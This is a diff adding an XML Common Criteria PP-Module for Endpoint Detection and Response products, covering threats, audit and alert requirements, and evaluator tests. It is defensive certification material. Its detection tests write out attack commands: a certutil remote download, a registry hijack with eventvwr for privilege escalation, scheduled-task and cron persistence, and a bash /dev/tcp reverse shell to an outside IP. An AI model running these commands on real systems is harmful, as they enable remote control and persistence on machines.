@@ -1,0 +1,1224 @@
+<Module xmlns="https://niap-ccevs.org/cc/v1" xmlns:h="http://www.w3.org/1999/xhtml" xmlns:sec="https://niap-ccevs.org/cc/v1/section" name="Endpoint Detection and Response (EDR)" boilerplate="yes" target-product="Endpoint Detection and Response (EDR)" target-products="Endpoint Detection and Response (EDR)">
+  <PPReference>
+    <ReferenceTable>
+      <PPVersion>2.0</PPVersion>
+      <PPAuthor>National Information Assurance Partnership</PPAuthor>
+      <PPPubDate>2026-01-13</PPPubDate>
+      <Keywords>EDR, ESM</Keywords>
+    </ReferenceTable>
+  </PPReference>
+  <RevisionHistory>
+    <entry>
+      <version>1.0</version>
+      <date>2020-10-23</date>
+      <subject>First version released</subject>
+    </entry>
+    <entry>
+      <version>2.0</version>
+      <date>2026-01-13</date>
+      <subject>CC:2022 conversion</subject>
+    </entry>
+  </RevisionHistory>
+  <release-notes><h:h3>TDs Applied</h:h3></release-notes><include-pkg id="pkg-tls">
+    <git>
+      <url>https://github.com/commoncriteria/tls</url>
+      <branch>release-2.1</branch>
+    </git>
+    <url>https://commoncriteria.github.io/tls/release-2.1/tls-release.html</url>
+    <depends on-sel="itt-tls-from-package"/>
+    <depends on-sel="itt-invoke-platform-tls"/>
+    <depends on-sel="trp-tls-from-package"/>
+    <depends on-sel="trp-invoke-platform-tls"/>
+  </include-pkg>
+  <pp-preferences/>
+  <sec:Introduction>
+    <section id="ppoverview" title="Overview">
+      The scope of this PP-Module is to describe the security functionality of an Endpoint Detection and Response (EDR) system in terms of [CC] 
+      and to define functional and assurance requirements for such products. This PP-Module is intended for use with the following Base-PPs:
+      <h:ul>
+        <h:li>Protection Profile for Application Software <xref to="bibAppPP"/>, Version 2.0.</h:li>
+      </h:ul>
+      This Base-PP is valid because an EDR is deployed as a software application on a general-purpose operating system.
+    </section>
+    <tech-terms>
+      <term full="Alert">An event or notification on the management dashboard that highlights
+        potentially unauthorized activity.</term>
+      <term full="Endpoint">A computing device that runs a general purpose OS, a mobile
+        device OS, or network device OS. Endpoints can include desktops, servers, and mobile devices.</term>
+      <term full="Endpoint Detection and Response" abbr="EDR">
+        Server software that analyzes collected EDR Host Agent data for detecting,
+        investigating, and remediating unauthorized activities on endpoints. The terms
+        <h:i>TOE</h:i>
+        and
+        <h:i>EDR</h:i>
+        are interchangeable in this
+        document.
+      </term>
+      <term full="Endpoint Detection and Response System">The EDR server and the Host Agents they operate with.</term>
+      <term full="Enroll">The act of registering an HA endpoint with the EDR.</term>
+      <term full="Host Agent">Complementary software that executes on endpoints to collect data about the
+        endpoint and executes commands sent to the endpoint from an Enterprise Security Management
+        (ESM) server or service. An example command sent to an endpoint could be to enforce a
+        policy from an ESM, to collect some files, or to run an OS command.</term>
+      <term full="Management Dashboard">A management interface for the configuration of EDR policy, visualization
+        of collected endpoint alert data, and issuing of remediation commands.</term>
+      <term full="Potentially Unauthorized Activity">This refers to the set of activities detected by the TOE, specific items detected may be unique to the TOE</term>
+      <term full="SOC Analyst">Security Operations Center (SOC) Analyst is typically the person
+        responsible for reviewing potentially unauthorized activities via alerts and
+        performing remediation and clean up.</term>
+      <term full="Application Programming Interface" abbr="API"/>
+      <term full="Common Event Format" abbr="CEF"/>
+      <term full="Cyber Observable expression" abbr="CybOX"/>
+      <term full="Deterministic Random Bit Generator" abbr="DRBG"/>
+      <term full="Digital Signature Standard" abbr="DSS"/>
+      <term full="Datagram Transport Layer Security" abbr="DTLS"/>
+      <term full="Endpoint Detection and Response" abbr="EDR"/>
+      <term full="Hypertext Transfer Protocol Secure" abbr="HTTPS"/>
+      <term full="Incident Object Description Exchange Format" abbr="IODEF"/>
+      <term full="Internet Protocol" abbr="IP"/>
+      <term full="Information Technology" abbr="IT"/>
+      <term full="Log Event Extended Format" abbr="LEEF"/>
+      <term full="Operating System" abbr="OS"/>
+      <term full="Random Bit Generator" abbr="RBG"/>
+      <term full="Structured Threat Information expression" abbr="STIX"/>
+      <term full="Transport Layer Security" abbr="TLS"/>
+    </tech-terms>
+    <section title="Compliant Targets of Evaluation" id="TOEdescription">
+      An EDR is
+      enterprise management software that collects endpoint host data to detect potentially
+      unauthorized activity on endpoints and to enable threat hunting and other incident response
+      actions to remediate malicious behaviors. These requirements cover basic security characteristics 
+      and behaviors for EDR products; the platform on which the EDR runs may be a physical or virtual 
+      Operating System (OS), and on-premises or in a cloud environment.
+      <h:br/>
+      <h:br/>
+      EDR products rely on additional software running on the endpoint, called the Host
+      Agent, to communicate commands or policy changes and to receive endpoint host data. Security
+      requirements for the Host Agent are addressed in the separate
+      <xref to="bibHAGT"/>
+      PP-Module. Evaluation of an EDR system will require evaluations of different system components 
+      consisting of EDR and
+      <xref to="bibHAGT"/>. Each evaluation must satisfy the requirements 
+      in both the EDR and HA in addition to its Base-PP Application Software.
+      
+      
+      Evaluation of an EDR system will require evaluation of different system components consisting of one EDR 
+      and at least one Host Agent. Therefore, the evaluation must claim conformance to a PP-Configuration that 
+      includes the PP-Module for Endpoint Detection and Response (EDR) and the PP-Module for Host Agent.
+      <h:br/>
+      <h:br/>
+      There are two primary architectural categories addressed by requirements in this
+      PP-Module, as seen in Figure 1.
+      <h:ul>
+        <h:li>Endpoints communicate over the Internet to an EDR hosted by a cloud service provider (Software as a Service).</h:li>
+        <h:li>Endpoints communicate with an on-premises EDR in a hub and spoke network model.</h:li>
+      </h:ul>
+      <figure entity="images/edr_archi.png" title="Primary EDR Architectures" id="toe_arch"/>
+      <sec:TOE_Boundary>
+        The TOE boundary for the EDR encompasses
+        all the software from the TOE vendor that represents the server or enterprise management
+        side of the EDR system. This will typically, but not always, be software running behind a
+        web application or dashboard, and possibly with other software services running to send and
+        receive data with a Host Agent. The EDR may also make use of a database to store collected
+        and analyzed data. Any database software itself is outside the scope of the TOE, as is any
+        web server software used to serve a web application or dashboard, and the underlying
+        operating system or cloud platform. The figure below shows EDR (right) communicating with
+        its Host Agent (left) over an untrusted network.
+        <h:p/>
+        The requirements for the Host Agent are not covered in this PP-Module, however it is expected that an ESM 
+	system will evaluate against a PP-Configuration that includes both the EDR PP-Module  and the
+        <xref to="bibHAGT"/>
+        PP-Module.
+        <figure entity="images/edr_overview.png" title="EDR and Host Agent Communications" id="toe_overview"/>
+      </sec:TOE_Boundary>
+      <sec:TOE_Platform>
+        The TOE platform, which consists of the OS or 
+	      Cloud platform on which the EDR software executes,  is outside the scope of evaluation. 
+	      However, the security of the EDR relies upon it.
+        <h:p/>
+        Any
+        communications with trusted remote file reputation or threat intelligence services is
+        relevant to overall EDR system security but is also outside the scope of evaluation.
+      </sec:TOE_Platform>
+    </section>
+    <sec:Use_Cases>
+      Requirements in this PP-Module are designed to address
+      the security problem for the following use cases. An EDR's functionality may be
+      extended by add-ons, plug-ins, threat feeds, or other reputation services. These are out of
+      scope of this PP-Module.
+      <usecases>
+        <usecase title="Detection of Potential Unauthorized Activity" id="detect">
+          <description>The detection of potentially unauthorized activity, software, or users is
+            enabled by the collection of host-based endpoint data to a central EDR where the data is
+            analyzed.</description>
+        </usecase>
+        <usecase title="Remediation of Malicious Activity" id="response">
+          <description>The ability to initiate remediation commands to attempt a clean up of
+            detected malicious activity is a key use case of EDR.</description>
+        </usecase>
+        <usecase title="Discovery" id="discovery">
+          <description>The capability to effectively browse, query, and export aggregated host-based
+            endpoint data enables a SOC analyst to discover adversaries in post-compromise
+            scenarios.</description>
+        </usecase>
+      </usecases>
+    </sec:Use_Cases>
+  </sec:Introduction>
+  <sec:Conformance_Claims title="Conformance Claims" id="sec-cclaims">
+    <CClaimsInfo cc-version="cc-2022r1" cc-approach="direct-rationale" display="yes">
+      <cc-st-conf>exact</cc-st-conf>
+      <cc-pt2-conf>extended</cc-pt2-conf>
+      <cc-pt3-conf>extended</cc-pt3-conf>
+      <cc-pp-conf/>
+      <cc-pp-config-with>
+        <PP-cc-ref>Protection Profile for Application Software, Version 2.0</PP-cc-ref>
+        <Mod-cc-ref>PP-Module for Enterprise-Management (EM), Version 2.0</Mod-cc-ref>
+        <Mod-cc-ref>PP-Module for Host Agent (HA), Version 2.0</Mod-cc-ref>
+      </cc-pp-config-with>
+      <cc-pkg-claim>
+        <FP-cc-ref conf="conformant">Functional Package for SSH, Version 2.0</FP-cc-ref>
+        <FP-cc-ref conf="conformant">Functional Package for TLS, Version 2.1</FP-cc-ref>
+        <FP-cc-ref conf="conformant">Functional Package for X.509, Version 1.0</FP-cc-ref>
+      </cc-pkg-claim>
+    </CClaimsInfo>
+  </sec:Conformance_Claims>
+  <!-- 3.0 Security Problem Definition-->
+  <section title="Security Problem Definition" id="spd">
+    The security problem is described in terms
+    of the threats that the EDR is expected to address, assumptions about the
+    OE, and any organizational security policies that the EDR
+    is expected to enforce.  These extend any threats, assumptions, and organizational security policies defined by the Base-PP.
+    <!-- 3.1 Threats -->
+    <sec:Threats>
+      <threats>
+        <threat name="T.CREDENTIAL_REUSE">
+          <description>An attacker is positioned on a communications channel or elsewhere on the            network infrastructure. Attackers may guess or harvest legitimate credentials from the            EDR, endpoints, or insecure network activity.</description>
+          <consistency-rationale>This threat is a specific example of T.NETWORK_EAVESDROP defined in the Base-PP.</consistency-rationale>
+          <!-- New mapping to build updated threat mapping table. -->
+          <addressed-by>FPT_ITT.1</addressed-by>
+          <rationale>The PP-Module includes FPT_ITT.1 to define the internal trusted channel that the TSF uses to communicate with connected Host Agents as well as the communications protocols used to establish these trusted channels.</rationale>
+          <addressed-by>FTP_TRP.1</addressed-by>
+          <rationale>The PP-Module includes FTP_TRP.1 to define the communications protocols used to support secure remote administration of the TSF.</rationale>
+        </threat>
+        <threat name="T.MISCONFIGURATION">
+          <description>An attacker is a legitimate privileged user with access to change            the configuration of the EDR's security capabilities or is not a legitimate             privileged user trying to access without proper authorization. Attackers may            attempt to hide malicious activities from other privileged users.</description>
+          <consistency-rationale>This threat is consistent with the Base-PP because it is a specific example of the T.LOCAL_ATTACK threat defined there. 
+          In this case, the local attack is to maliciously alter the behavior of the application itself rather than to use the application as a method to attack the OS platform.</consistency-rationale>
+          <!-- New mapping to build updated threat mapping table. -->
+          <addressed-by>FAU_ALT_EXT.1</addressed-by>
+          <rationale>The PP-Module includes FAU_ALT_EXT.1 to facilitate management by providing a function for authorized users to interact with security-relevant data that is provided to the TSF.</rationale>
+          <addressed-by>FAU_COL_EXT.1</addressed-by>
+          <rationale>The PP-Module includes FAU_COL_EXT.1 to facilitate management by defining the security-relevant data that is collected by the TSF.</rationale>
+          <addressed-by>FAU_GEN.1/EDR</addressed-by>
+          <rationale>The PP-Module includes FAU_GEN.1/EDR
+            to ensure that the TOE provides accountability through the generation of audit data for security-relevant events.</rationale>
+          <addressed-by>FIA_AUT_EXT.1</addressed-by>
+          <rationale>The PP-Module includes FIA_AUT_EXT.1 to define how management users are authenticated by the TSF to limit the subjects that can execute management functions on the TOE.</rationale>
+          <addressed-by>FIA_PWD_EXT.1</addressed-by>
+          <rationale>The PP-Module includes FIA_PWD_EXT.1 to define composition requirements for the Password Authentication Factor to ensure that an authorized user cannot access protected management functions without authorization.</rationale>
+          <addressed-by>FMT_SMF.1/ENDPOINT</addressed-by>
+          <rationale>The PP-Module includes FMT_SMF.1/ENDPOINT to define the management functions that can be performed to control the behavior of the TSF and the management roles that are authorized to perform those functions.</rationale>
+          <addressed-by>FMT_SMF.1/HOST</addressed-by>
+          <rationale>The PP-Module includes FMT_SMF.1/HOST to define the management functions that can be performed to control the behavior of Host Agents that are connected to the TOE and the management roles that are authorized to perform those functions.</rationale>
+          <addressed-by>FMT_SMR.1</addressed-by>
+          <rationale>The PP-Module includes FMT_SMR.1 to define the management roles that the TSF supports so that its management functions can be separated by role.</rationale>
+          <addressed-by>FMT_SRF_EXT.1</addressed-by>
+          <rationale>The PP-Module includes FMT_SRF_EXT.1 to define the remediation functions that are available to authorized users to issue corrective actions on a system that has a connected Host Agent.</rationale>
+          <addressed-by>FMT_TRM_EXT.1 (objective)</addressed-by>
+          <rationale>The PP-Module includes FMT_TRM_EXT.1 to provide an optional capability to ensure the integrity of management commands and policies issued to external Host Agents through use of a digital signature.</rationale>
+        </threat>
+      </threats>
+    </sec:Threats>
+    <!-- 3.2 Assumptions -->
+    <sec:Assumptions>
+      <assumptions>
+        <assumption name="A.CONNECTIVITY">
+          <description>The TSF relies on network connectivity to carry out its
+          management activities. The OE will provide reliable network connectivity for the EDR to operate.
+            The EDR will robustly handle occasional instances when
+          connectivity is unavailable or unreliable.</description>
+          <consistency-rationale>This assumption is consistent with the Base-PP because assuming network availability is consistent with the A.PLATFORM
+          assumption defined by the Base-PP, which expects the TOE to have a trustworthy computing platform.</consistency-rationale>
+          <objective-refer ref="OE.RELIABLE_TRANSIT">
+            <rationale>The OE objective OE.RELIABLE_TRANSIT is realized through
+            A.CONNECTIVITY.</rationale>
+          </objective-refer>
+        </assumption>
+      </assumptions>
+    </sec:Assumptions>
+    <!-- 3.3 Organizational Security Policies -->
+    <sec:Organizational_Security_Policies>
+      <OSPs/>
+    </sec:Organizational_Security_Policies>
+  </section>
+  <!-- 4.0 Security Objectives -->
+  <sec:Security_Objectives>
+    <!-- 4.1 Security Objectives for the TOE -->
+    <!-- 4.2 Security Objctives for the Operational Environment -->
+    <section title="Security Objectives for the Operational Environment" id="SecurityObjectivesTOEorEnvironment">
+      The following security objectives for the Operational Environment assist the EDR in correctly providing its security functionality. These track with the assumptions about the environment.
+      <SOEs>
+        <SOE name="OE.RELIABLE_TRANSIT">
+          <description>Wired or wireless network traffic between the EDR and
+            host agents will provide reasonably reliable connectivity.</description>
+          <consistency-rationale>This objective relates to an external interface that does not exist in the Base-PP
+          and does not affect Base-PP functionality.</consistency-rationale>
+        </SOE>
+      </SOEs>
+    </section>
+    <!-- 4.3 Security Objectives Rationale -->
+    <sec:Security_Objectives_Rationale/>
+  </sec:Security_Objectives>
+  <!-- 5.0 Security Requirements -->
+  <sec:Security_Requirements title="Security Requirements">
+    <!-- 5.1 App PP Security Functional Requirements Direction -->
+    <base-pp id="AppPP" name="Application Software" product="Application" short="App" version="2.0">
+      <git>
+        <url>https://github.com/commoncriteria/application</url>
+        <branch>release-2.0</branch>
+      </git>
+      <url>https://github.com/commoncriteria/application</url>
+      <sec-func-req-dir>
+        In a PP-Configuration that includes
+        <xref to="bibAppPP"/>, the TOE is expected to rely on some of the security functions implemented by the application as a whole and evaluated against the Base-PP.
+The SFRs listed in this section are defined in the Base-PP and relevant to the secure operation of the EDR.
+This section describes any modifications that the ST author must make to the Base-PP SFRs to satisfy the required EDR functionality.
+      </sec-func-req-dir>
+      <!-- 5.1.1 Modified SFRs -->
+      <modified-sfrs/>
+      <!-- 5.1.2 Additional SFRs -->
+      <additional-sfrs/>
+      <con-toe>If this PP-Module is used to extend the Application Software PP, the TOE type for
+        the overall TOE is still a software-based application. The TOE boundary is simply extended
+        to include the EDR functionality that is built into the application so that additional
+        security functionality is claimed within the scope of the TOE.</con-toe>
+      <con-sec-prob/>
+      <con-obj/>
+      <con-op-en/>
+      <con-mod ref="T.MISCONFIGURATION">This threat applies to management functionality that is introduced in this PP-Module and does not affect the functionality described by the Base-PP.</con-mod>
+      <con-mod ref="T.CREDENTIAL_REUSE">This threat applies to authentication functionality that is introduced in this PP-Module and does not affect the functionality described by the Base-PP.</con-mod>
+    </base-pp>
+    <!-- 5.2 TOE Security Functional Requirements -->
+    <man-sfrs>
+      <section id="sec-sel-audit-table" title="Auditable Events for Mandatory SFRs">
+        <audit-table id="at-Man" table="mandatory"/>
+      </section>
+      <!-- 5.2.1 Security Audit (FAU) -->
+      <section title="Security Audit (FAU)" id="fau-mandatory">
+        <ext-comp-def title="Server Alerts" fam-id="FAU_ALT_EXT">
+          <fam-behavior>Components in this family define requirements for system activity that causes the TSF to generate an alert of the activity and for the contents of these alerts.</fam-behavior>
+        </ext-comp-def>
+        <ext-comp-def title="Collected Endpoint Data" fam-id="FAU_COL_EXT">
+          <fam-behavior>Components in this family define requirements for the data that is collected from a Host Agent.</fam-behavior>
+        </ext-comp-def>
+        <!-- FAU_ALT_EXT.1 Server Alerts -->
+        <f-component cc-id="fau_alt_ext.1" id="fau-alt-ext-1" name="Server Alerts">
+          <consistency-rationale>
+            This SFR defines auditable alerts for the EDR. It does not
+              impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <comp-lev> describes alert triggers and the information contained in alerts.</comp-lev>
+          <management>The following actions could be considered for the management functions in FMT: <h:ul><h:li>Configure visual suppression of alerts.</h:li></h:ul></management>
+          <audit>There are no auditable events foreseen.</audit>
+          <dependencies>No dependencies.</dependencies>
+          <f-element id="fau-alt-ext-1-1">
+            <title>The TSF shall alert authorized users on a management dashboard
+                in the event of: detection of potentially unauthorized activity on enrolled endpoints.</title>
+            <note role="application">
+              The intent of this requirement is to specify the minimum set
+                of management dashboard alert capabilities the EDR must be capable
+                of displaying to an authorized user.
+              <h:p/>
+              Examples of detection of potentially unauthorized activity on enrolled endpoints include;
+                anomalous activity, escalation of privileges, and lateral movement.
+            </note>
+          </f-element>
+          <f-element id="fau-alt-ext-1-2">
+            <title>
+              The TSF shall provide a visualization of detected alerts of
+                potentially unauthorized incidents, and shall include:
+              <h:ol type="a">
+                <h:li>An initial incident severity and  <selectables><selectable id="fau_alt_ext.1.2_1">assessment</selectable><selectable id="fau_alt_ext.1.2_2">categorization</selectable><selectable id="fau_alt_ext.1.2_3">score</selectable><selectable id="fau_alt_ext.1.2_4">ranking</selectable></selectables>,</h:li>
+                <h:li>An incident timeline.</h:li>
+              </h:ol>
+            </title>
+            <note role="application">The intent of this requirement is to specify the minimum set
+                of incident visualizations the EDR must be capable of displaying
+                to an authorized user. Visualization is broadly defined as the display of incident
+                data to an authorized user on the management dashboard. The visualization is not
+                required to be interactive.</note>
+          </f-element>
+          <f-element id="fau-alt-ext-1-3">
+            <title>
+              The TSF shall provide a data export capability for
+                  selected alerts with a specified standards-based format of
+              <selectables linebreak="yes">
+                <selectable id="fau_alt_ext.1.3_1">Structured Threat Information expression (STIX)</selectable>
+                <selectable id="fau_alt_ext.1.3_2">Cyber Observable expression (CybOX)</selectable>
+                <selectable id="fau_alt_ext.1.3_3">Incident Object Description Exchange Format (IODEF)</selectable>
+                <selectable id="fau_alt_ext.1.3_4">Common Event Format (CEF)</selectable>
+                <selectable id="fau_alt_ext.1.3_5">Log Event Extended Format (LEEF)</selectable>
+              </selectables>.
+            </title>
+            <ext-comp-def-title>
+              <title>
+                The TSF shall provide a data export capability for
+                    selected alerts with a specified standards-based format of
+                <assignable>alert format</assignable>.
+              </title>
+            </ext-comp-def-title>
+            <note role="application">The intent of this requirement is to specify a selection of
+                standards-based formats the EDR must provide for the export of selected alerts, at least one must be selected.</note>
+            <aactivity>
+              <TSS>
+                The evaluator shall examine the TSS to ensure that it describes how alerts for changes in potentially unauthorized activities on enrolled endpoints are detected and displayed.
+                    The evaluator shall examine the TSS to ensure it contains the
+                    list of unauthorized activity types categorized or labeled by the EDR upon
+                    detection.
+                <h:br/>
+                <h:br/>
+                The evaluator shall examine the TSS to ensure that it describes how alert visualizations 
+                    are displayed and what content is included.
+                <h:br/>
+                <h:br/>
+                The evaluator shall examine the TSS to ensure that it describes what formats are supported.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall review operational guidance to identify a
+                  list of unauthorized activity types categorized or labeled by the EDR upon
+                  detection.
+                <h:br/>
+                <h:br/>
+                The evaluator shall ensure guidance includes any needed configuration information for displaying alerts 
+                  in relation to changes in Host Agent enrollment status and potentially unauthorized activities.
+                <h:br/>
+                <h:br/>
+                The evaluator shall review the operational guidance to ensure that it
+                  contains documentation on using the management dashboard to visualize and view
+                  alerts.
+                <h:br/>
+                <h:br/>
+                The evaluator shall examine the guidance documentation to ensure it describes the formats supported and the methods of data export being claimed (e.g., written to a file on the underlying platform, communication over a TOE interface to another product, etc.). If communication over a TOE interface to another product (other than the underlying platform) is required to export the data, the evaluator shall verify the guidance documentation describes what products or product types are supported, how to establish communication with those products, any requirements on those products (particular communication protocol, version of the protocol required, etc.), and the configuration of the TOE needed to communicate with those products.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                The evaluator shall perform the following tests:
+                <testlist>
+                  <h:b>For Windows,</h:b>
+                  the evaluator shall test the EDR's ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:
+                  <test>The evaluator shall open a Windows command prompt as a user and run the command <h:code>cmd /c certutil -urlcache -split -f &lt;remote file&gt;
+                        &lt;download directory&gt;</h:code>, where the remote file is a valid file path to an accessible, remotely stored executable, and the download directory is a valid directory path writable by the current local user.</test>
+                  <test>The evaluator shall open a Windows command prompt as a user and run the command <h:code>reg.exe add hkcu\software\classes\mscfile\shell\open\command
+                        /ve /d "&lt;local executable&gt;" /f</h:code>, where the local executable is a valid file path to a readable, local executable. The evaluator will then run the command <h:code>cmd.exe /c eventvwr.msc</h:code> in the same command prompt window.</test>
+                  <test>The evaluator shall open a Windows command prompt as a user and run the command <h:code>SCHTASKS /Create /SC ONCE /TN spawn /TR &lt;local
+                        executable&gt;" /ST &lt;time&gt;</h:code>, where the local executable is a valid file path to a readable, local executable, and time is a start time that occurs within minutes of the task being created.</test>
+                </testlist>
+                <testlist>
+                  <h:b>For Linux,</h:b>
+                  the evaluator shall test the EDR's ability to detect anomalous activity by performing the following subtests based on the platform of the enrolled Host Agent's system, verifying for each that, corresponding alerts were generated in the management dashboard:
+                  <test>The evaluator shall open a terminal and run the command <h:code>scp
+                      &lt;remote user&gt;@&lt;remote host&gt;:&lt;remote path&gt;
+                      &lt;download directory&gt;</h:code>, where the remote user is a valid user on remote host, remote path is a valid path to a remotely stored executable, and the download directory is a valid directory path writable by the current local user. The remote user's password shall be provided when prompted.</test>
+                  <test>The evaluator shall open a terminal and run the command <h:code>echo
+                      "bash -i &gt;&amp; /dev/tcp/&lt;outside IP&gt;/5050 0&gt;&amp;1 1 &amp;" &gt; 
+                      /etc/cron.hourly/persist</h:code>, where the outside IP is a valid external address.</test>
+                </testlist>
+                <testlist>
+                  <h:b>For all platforms:</h:b>
+                  <test>The evaluator shall review an alert on the management dashboard and verify that the alert contains a severity field and the fields specified in the ST. The evaluator will open or view the alert and verify that a timeline of events is available for review. The timeline shall show a progression of events over time.</test>
+                  <test>The evaluator shall pick an alert on the management dashboard and export the alert in every format specified in the ST. The evaluator shall review the operational guidance and the selection from the requirement and verify that export options exist for all the declared formats in the selection. After exporting one alert for each possible format the evaluator shall review the file contents of the exported alert and verify it is the correct format for the selected export option (for example, an export of the IODEF type must contain 'IODEF-Document' in the first element of the exported file).</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+        <!-- FAU_COL_EXT.1 Collected Endpoint Data -->
+        <f-component cc-id="fau_col_ext.1" id="fau-col-ext-1" name="Collected Endpoint Data">
+          <consistency-rationale>
+            This SFR defines the minimum event data that the EDR collects
+              from a Host Agent. It does not impact the
+            <xref to="bibAppPP"/>
+            functionality.
+          </consistency-rationale>
+          <comp-lev> identifies the specific data collected from a Host Agent.</comp-lev>
+          <management>The following actions could be considered for the management functions in FMT: <h:ul><h:li>Configuration of the time period for transmission of collected data.</h:li> <h:li>Configuration of label or tag information to associate collected data with individual endpoint systems or groups of systems.</h:li></h:ul></management>
+          <audit>There are no auditable events foreseen.</audit>
+          <dependencies>No dependencies.</dependencies>
+          <f-element id="fau_col_ext-1-1">
+            <title>
+              The TSF shall collect the following minimum set of endpoint
+                data from a Host Agent:
+              <h:ol type="a">
+                <h:li>Operating System (OS) version, architecture, and IP Address,</h:li>
+                <h:li>Privileged and unprivileged endpoint account login activity,</h:li>
+                <h:li>Process creation,</h:li>
+                <h:li>Libraries and modules loaded by processes,</h:li>
+                <h:li>Filenames and  <selectables><selectable id="fau_col_ext.1.1_2"><assignable>other metadata</assignable></selectable><selectable id="fau_col_ext.1.1_3">no other metadata</selectable></selectables>  of files created and  <selectables><selectable id="fau_col_ext.1.1_5"><assignable>other activities performed to files</assignable></selectable><selectable id="fau_col_ext.1.1_6">no other activities</selectable></selectables>  on persistent storage,</h:li>
+                <h:li> <selectables><selectable id="fau_col_ext.1.1_8"><assignable>other host data</assignable></selectable><selectable id="fau_col_ext.1.1_9">no other host data</selectable></selectables>.</h:li>
+              </h:ol>
+            </title>
+            <note role="application">The intent of this requirement is to specify the minimum set
+                of endpoint data that the EDR must be capable of collecting. The assignments may be a single item or multiple items.</note>
+            <aactivity>
+              <TSS>The evaluator shall verify that all supported endpoint event data types are described.<h:p/></TSS>
+              <Guidance>
+                The evaluator shall review the operational guidance and ensure that it
+                  lists all of the collectable types of endpoint event data.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                The evaluator shall perform the following tests:
+                <testlist>
+                  <test>The evaluator shall verify the OS version, architecture, and IP address of a system managed by a Host Agent against the data reported to the EDR.</test>
+                  <test>The evaluator shall log in to a system managed by a Host Agent with two separate accounts and verify that the activity is accurately reported to the EDR.</test>
+                  <test>The evaluator shall run a known user application provided on the platform OS and verify that subsequent process creation and module loading is accurately reported to the EDR.</test>
+                  <test>
+                    <testlist>
+                      <test>The evaluator shall create a new, non-empty file in persistent storage and verify that the activity is accurately reported to the EDR based on filename and any other metadata indicated in bullet e.</test>
+                      <test>(Conditional): If other activities performed on files are indicated in bullet e, the evaluator shall perform them on a non-empty file within persistent storage and verify that the activity is accurately reported to the EDR based on filename and any other metadata indicated in bullet e.</test>
+                    </testlist>
+                  </test>
+                  <test>(Conditional): If other host data is indicated in the assignment in bullet f, the evaluator shall perform an action that causes an event to occur for all items in the assignment and verify the activity is reported to the EDR.</test>
+                </testlist>
+              </Tests>
+            </aactivity>
+          </f-element>
+          <audit-event table="mandatory"/>
+        </f-component>
+        <!-- FAU_GEN.1/EDR Audit Data Generation -->
+        <f-component cc-id="fau_gen.1" id="fau-gen-1-edr" name="Audit Data Generation" iteration="EDR">
+          <consistency-rationale> This SFR defines the minimum event data that the EDR server must record about authorized management dashboard activity. It does not impact the <xref to="bibAppPP"/> functionality. </consistency-rationale>
+          <comp-lev> defines auditable events for the use of the EDR management functionality.</comp-lev>
+          <management>There are no specific management functions identified.</management>
+          <audit>There are no auditable events foreseen.</audit>
+          <dependencies>FMT_SMF.1 Specification of Management Functions</dependencies>
+          <f-element id="fau_gen-1-1_EDR">
+            <title>
+              The TSF shall be able to generate audit data of the following auditable events:
+              <h:ol type="a">
+                <h:li>
+                  <h:s>Start-up and shutdown of the audit functions;</h:s>
+                </h:li>
+                <h:li>All auditable events for the [<h:i>not specified</h:i>] level of audit;</h:li>
+              </h:ol>
+              [<h:i>
+                <h:ol type="a">
+                  <h:li>EDR management dashboard log in activity;</h:li>
+                  <h:li>Remediation commands sent to a Host Agent, affected endpoint, or network devices;</h:li>
+                  <h:li>EDR configuration changes;</h:li>
+                  <h:li>Change in Host Agent enrollment status;</h:li>
+                  <h:li>
+                    <assignable>Other auditable events</assignable>
+                  </h:li>
+                </h:ol>
+              </h:i>].
+            </title>
+            <note role="application">The intent of this requirement is to specify the minimum set
+                of audit data generated about actions on the EDR. Changes made to configuration files at the OS level will be audited by the OS and are not covered by this requirement.</note>
+          </f-element>
+          <f-element id="fau_gen-1-2_EDR">
+            <title>
+              The TSF shall record within the audit data at least the following information:
+              <h:ol type="a">
+                <h:li>date and time of the event,</h:li>
+                <h:li>type of event,</h:li>
+                <h:li>subject identity (if applicable),</h:li>
+                <h:li>and the outcome (success or failure) of the event,</h:li>
+                <h:li>For each auditable event type, based on the auditable event definitions of the functional components included in the PP, PP-Module, functional package, or ST, <assignable>other audit relevant information</assignable>.</h:li>
+              </h:ol>
+            </title>
+            <note role="application">This requirement outlines the information to be included in
+              audit data. All audits must 
+              contain at least the information mentioned in FAU_GEN.1.2/EDR, but may contain more information 
+              which can be assigned.</note>
+            <aactivity>
+              <TSS>
+                The evaluator shall check the TSS and ensure that it lists all of the auditable events claimed in the SFR. 
+                The evaluator shall check to make sure that every audit event type specified by the SFR is described in the TSS.
+                <h:br/>
+                <h:br/>
+                The evaluator shall check the TSS and ensure that it provides a format for audit
+                data. 
+                Each audit record format type must be covered, along with a brief description of each field.
+                <h:p/>
+              </TSS>
+              <Guidance>
+                The evaluator shall check the administrative guide and ensure that it lists all of the auditable events claimed in the SFR. 
+                The evaluator shall check to make sure that every audit event type mandated by the SFR is described.
+                <h:br/>
+                <h:br/>
+                The evaluator shall examine the administrative guide and make a determination of which 
+                commands are related to the configuration (including enabling or disabling) 
+                of the mechanisms implemented in the EDR that are necessary to enforce the 
+                requirements specified in the PP-Module. The evaluator shall document the methodology or 
+                approach taken while determining which actions in the administrative guide are security relevant with 
+                respect to this PP-Module. The evaluator may perform this activity as part of the activities 
+                associated with ensuring the AGD_OPE guidance  satisfies the requirements.
+                <h:br/>
+                <h:br/>
+                The evaluator shall check the administrative guide and ensure that it provides a
+                format for audit data. 
+                Each audit record format type must be covered, along with a brief description of each field. The evaluator shall 
+                check to make sure that the description of the fields contains the information required in FAU_GEN.1.2/EDR.
+                <h:br/>
+                <h:br/>
+                The evaluator shall review operational guidance to ensure that it contains documentation on enrolling and unenrolling Host Agents from the EDR.
+                <h:p/>
+              </Guidance>
+              <Tests>
+                The evaluator shall perform the following tests:
+                <testlist>
+                  <test>The evaluator shall login to the EDR management dashboard and verify that audit log data describing the activity is recorded.</test>
+                  <test>The evaluator shall issue a valid remediation command provided by the EDR to a Host Agent and verify that audit log data describing the activity is recorded on the EDR management dashboard.</test>
+                  <test>The evaluator shall change a non-destructive EDR configuration option within the EDR management dashboard, change it back to the original setting, and verify that the audit log data describing the activity is recorded.</test>
